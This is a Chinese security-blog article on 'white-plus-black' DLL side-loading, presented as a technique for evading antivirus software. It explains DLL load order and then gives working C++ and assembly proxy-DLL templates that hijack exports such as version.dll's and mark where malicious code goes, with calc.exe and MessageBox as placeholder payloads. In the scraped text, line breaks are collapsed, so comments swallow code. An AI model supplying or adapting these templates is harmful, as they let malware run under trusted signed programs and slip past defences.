---
title: 掘影—白加黑自动挖掘工具&amp;DLL侧加载
url: https://mp.weixin.qq.com/s/ibrk_UKo_ogYPTsfUCHbrA
source: Doonsec's feed
date: 2026-04-10
fetch_date: 2026-04-11T04:17:46.673078
---

# 掘影—白加黑自动挖掘工具&amp;DLL侧加载

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/pgh9MpJCA6g17iaH0yicSjCib1nSbIdYY3j6L2RepjIxQbnxrerGibW2eqlPKwGPW7WEbaHwVPLmUgX5sLdPyM458XO3vsEsAXfZ3VQjQCS9MNE/0?wx_fmt=jpeg)

# 掘影—白加黑自动挖掘工具&DLL侧加载

原创

脸红ฅฅ的思春期
脸红ฅฅ的思春期

Heri76安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

## 前言

在目前的免杀对抗中，包括这几年的银狐热门手法，白加黑都是一个绕不过的技术点。很多人喜欢称为DLL劫持或者DLL侧加载，但无论怎么叫，其原理都是一样的，通过一个白的exe去加载黑的DLL。

## 加载方式

#### 静态加载

静态加载DLL(也称为隐式加载或预加载)，指的是程序一启动，操作系统就会把它依赖的所有静态加载的DLL一起加载到内存中。是一种“硬依赖”或“强绑定”，在编译链接阶段就已经确定， 简单直接。要么所有东西都准备好，程序正常运行；要么任何一个DLL缺失，程序根本无法启动，并弹出一个类似“找不到xxx.dll”的错误。

从一个exe的导入表便可以看到静态加载了哪些DLL，值得一提的是，DLL里面的导出函数不一定被使用。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pgh9MpJCA6jsQiaC3qRZOrWWk4BG2HBZWzYONEGTPjcXlX0dEOZYqoCicUzO72EOia6hGYeftmBW2pkurk7njHdflXCUvjibFibpfnsvSKloCka0/640?wx_fmt=png&from=appmsg)

#### 动态加载

动态加载(也称为显式加载或运行时加载)，这是指程序在运行时根据需要动态地加载和卸载动态链接库。通常使用LoadLibrary和GetProcAddress函数来动态加载DLL。

这里简单说一下动态加载DLL的顺序。

1、检查DLL是否已经被加载进内存

2、检查DLL是否存在于Known DLLs中

3、检查应用当前目录是否存在DLL

4、检查System32目录下面是否存在DLL

5、检查当前执行目录下是否存在DLL

6、检测%PATH%环境变量 下是否存在DLL

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pgh9MpJCA6gBstnr9InFic1rn3DCUQu5Lets9buskPwWZXoSAtsqdW457IJYb1w34Waq3CEsiafUTAXax1Gn5p1ISjxMcIKo8ySUoLbcfpR6s/640?wx_fmt=png&from=appmsg)

就目前的白加黑中绝大多数都是利用第三步，也就是检查应用当前目录是否存在DLL，来进行DLL劫持。

## DLLmain死锁

当动态库被加载时，会执行动态库中的dllmain函数。但当程序进入dllmain函数时，会被施加一个锁的状态，该锁的存在就是微软为了限制dllmain的行为做了一些安全限制。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pgh9MpJCA6gYroNarvFNLViadteTkTd2ibwfpW5dRvQtfSTw8jBxcRibsEtUZW5LIqHJcxrpjKloIudYhflMBiaow01zD6KmqbVoCev4HxDNbkc/640?wx_fmt=png&from=appmsg)

死锁在DLL劫持中也是老生常谈的问题了，这里不过多赘述，感兴趣的可以参考下面的文章。

https://elliotonsecurity.com/perfect-dll-hijacking/#about-dllmain

## 函数转发

#### 链式转发

最常见的就是链式转发，通过 #pragma comment 转发指定导出函数到原本的DLL中。

```
#pragma comment(linker, "/EXPORT:ExportedFunctionName=OriginalDllName.OriginalFunctionName")
```

```
// MyHijackedDll.cpp#include <windows.h>
// --- 导出函数转发 ---// 将对 HelloWorld 的调用转发到 version_real.dll 中的 HelloWorld 函数#pragma comment(linker, "/EXPORT:HelloWorld=version_real.HelloWorld")
// 将对 Add 的调用转发到 version_real.dll 中的 Add 函数#pragma comment(linker, "/EXPORT:Add=version_real.Add")
// 你也可以转发通过序号导出的函数// #pragma comment(linker, "/EXPORT:SomeFunc=version_real.#123") // 假设SomeFunc按序号123导出
BOOL APIENTRY DllMain(HMODULE hModule,                      DWORD  ul_reason_for_call,                      LPVOID lpReserved){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        // 在这里执行你的恶意（建议创建一个新线程去执行，防止死锁）        MessageBox(NULL, L"DLL Hijacked!", L"Pwned", MB_OK);        break;    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}
```

简单粗暴，但是缺点也很明显，就是有多少个导出函数，就要手写多少个转发链接。并且不能指定转发到System目录下面的系统DLL，这就导致了一个问题，当你劫持系统的DLL时，你除了上传黑DLL之外还得把原版的系统DLL上传到同一目录，这样才能转发成功。

#### 手动转发

手动转发可以避免上述所提到的情况，可以指定加载System目录下面的系统DLL。原理也非常简单，通过劫持导出函数来实现即可。当白程序调用 MainEntry 时，它实际上调用的是我们写的恶意代码，等我们干完坏事，再由我们手动去加载 xxx.dll 里的真实代码。

```
#include <windows.h>// 定义一个函数指针类型，用于匹配原版 MainEntry 的样子// (假设它没有参数，如果不匹配可能会崩溃，但不影响测试弹计算器)typedef void (*OriginalMainEntryType)();
// 我们自己导出一个同名函数，拦截白程序的调用！extern "C" __declspec(dllexport) void MainEntry() {
    // 1. 我们的恶意载荷（因为这是主线程调用的，不用担心竞态条件，必定执行完毕）    WinExec("calc.exe", SW_SHOW);
    // 2. 载荷执行完后，为了让白程序正常工作，我们需要动态调用真正的 DLL    HMODULE hRealDll = LoadLibraryA("xxx.dll");    if (hRealDll != NULL) {        OriginalMainEntryType RealMainEntry = (OriginalMainEntryType)GetProcAddress(hRealDll, "MainEntry");        if (RealMainEntry != NULL) {            // 3. 把控制权交还给真实的业务逻辑            RealMainEntry();         }    }}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        // 在高级手法中，我们不在 DllMain 里开线程干活了，太容易出问题        // 只是取消线程通知优化一下        DisableThreadLibraryCalls(hModule);        break;    }    return TRUE;}
```

这样子的好处是可以加载指定的DLL，无需上传额外的DLL到同一目录。缺点也很明显，你要保证劫持的导出函数在白exe里面被调用才行，而且要知道原本的DLL导出函数是否传参，否则会加载失败。

#### 通过汇编转发

既然手动转发要知道导出函数是否传参，那么我们**劫持后直接跳走，不碰堆栈。**

实现如下，原理较为简单，没啥技术含量。

```
//dllmain.cpp
DWORD WINAPI Load() {
    HMODULE hRealDll = LoadLibraryExW(L"version.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
    //获取导出函数地址，并且存档数组中    RealFuncAddresses[0] = GetProcAddress(hRealDll, "GetFileVersionInfoA");    RealFuncAddresses[1] = GetProcAddress(hRealDll, "GetFileVersionInfoByHandle");    RealFuncAddresses[2] = GetProcAddress(hRealDll, "GetFileVersionInfoExA");    RealFuncAddresses[3] = GetProcAddress(hRealDll, "GetFileVersionInfoExW");    RealFuncAddresses[4] = GetProcAddress(hRealDll, "GetFileVersionInfoSizeA");    RealFuncAddresses[5] = GetProcAddress(hRealDll, "GetFileVersionInfoSizeExA");    RealFuncAddresses[6] = GetProcAddress(hRealDll, "GetFileVersionInfoSizeExW");    RealFuncAddresses[7] = GetProcAddress(hRealDll, "GetFileVersionInfoSizeW");    RealFuncAddresses[8] = GetProcAddress(hRealDll, "GetFileVersionInfoW");    RealFuncAddresses[9] = GetProcAddress(hRealDll, "VerFindFileA");    RealFuncAddresses[10] = GetProcAddress(hRealDll, "VerFindFileW");    RealFuncAddresses[11] = GetProcAddress(hRealDll, "VerInstallFileA");    RealFuncAddresses[12] = GetProcAddress(hRealDll, "VerInstallFileW");    RealFuncAddresses[13] = GetProcAddress(hRealDll, "VerLanguageNameA");    RealFuncAddresses[14] = GetProcAddress(hRealDll, "VerLanguageNameW");    RealFuncAddresses[15] = GetProcAddress(hRealDll, "VerQueryValueA");    RealFuncAddresses[16] = GetProcAddress(hRealDll, "VerQueryValueW");	return 0;
}
BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH: {        DisableThreadLibraryCalls(hModule);        Load();        //创建新线程去执行恶意代码    }    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}
```

```
//proxy.asm//直接通过汇编跳转到对应的导出函数地址，实现转发.code
EXTERN RealFuncAddresses:QWORD
GetFileVersionInfoA PROC    jmp qword ptr [RealFuncAddresses + 0]GetFileVersionInfoA ENDP
GetFileVersionInfoByHandle PROC    jmp qword ptr [RealFuncAddresses + 8]  ; 1 * 8GetFileVersionInfoByHandle ENDP
GetFileVersionInfoExA PROC    jmp qword ptr [RealFuncAddresses + 16] ; 2 * 8GetFileVersionInfoExA ENDP
GetFileVersionInfoExW PROC    jmp qword ptr [RealFuncAddresses + 24] ; 3 * 8GetFileVersionInfoExW ENDP
GetFileVersionInfoSizeA PROC    jmp qword ptr [RealFuncAddresses + 32] ; 4 * 8GetFileVersionInfoSizeA ENDP
GetFileVersionInfoSizeExA PROC    jmp qword ptr [RealFuncAddresses + 40] ; 5 * 8GetFileVersionInfoSizeExA ENDP
GetFileVersionInfoSizeExW PROC    jmp qword ptr [RealFuncAddresses + 48] ; 6 * 8GetFileVersionInfoSizeExW ENDP
GetFileVersionInfoSizeW PROC    jmp qword ptr [RealFuncAddresses + 56] ; 7 * 8GetFileVersionInfoSizeW ENDP
GetFileVersionInfoW PROC    jmp qword ptr [RealFuncAddresses + 64] ; 8 * 8GetFileVersionInfoW ENDP
VerFindFileA PROC    jmp qword ptr [RealFuncAddresses + 72] ; 9 * 8VerFindFileA ENDP
VerFindFileW PROC    jmp qword ptr [RealFuncAddresses + 80] ; 10 * 8VerFindFileW ENDP
VerInstallFileA PROC    jmp qword ptr [RealFuncAddresses + 88] ; 11 * 8VerInstallFileA ENDP
VerInstallFileW PROC    jmp qword ptr [RealFuncAddresses + 96] ; 12 * 8VerInstallFileW ENDP
VerLanguageNameA PROC    jmp qword ptr [RealFuncAddresses + 104] ; 13 * 8VerLanguageNameA ENDP
VerLanguageNameW PROC    jmp qword ptr [RealFuncAddresses + 112] ; 14 * 8VerLanguageNameW ENDP
VerQueryValueA PROC    jmp qword ptr [RealFuncAddresses + 120] ; 15 * 8VerQueryValueA ENDP
VerQueryValueW PROC    jmp qword ptr [RealFuncAddresses + 128] ; 16 * 8VerQueryValueW ENDP
END
```

```
//Source.def//导出函数LIBRARY "version"EXPORTS    GetFileVersionInfoA @1    GetFileVersionInfoByHandle @2    GetFileVersionInfoExA @3    GetFileVersionInfoExW @4    GetFileVersionInfoSizeA @5    GetFileVersionInfoSizeExA @6    GetFileVersionInfoSizeExW @7    GetFileVersionInfoSizeW @8    GetFileVersionInfoW @9    VerFindFileA @10    VerFindFileW @11   ...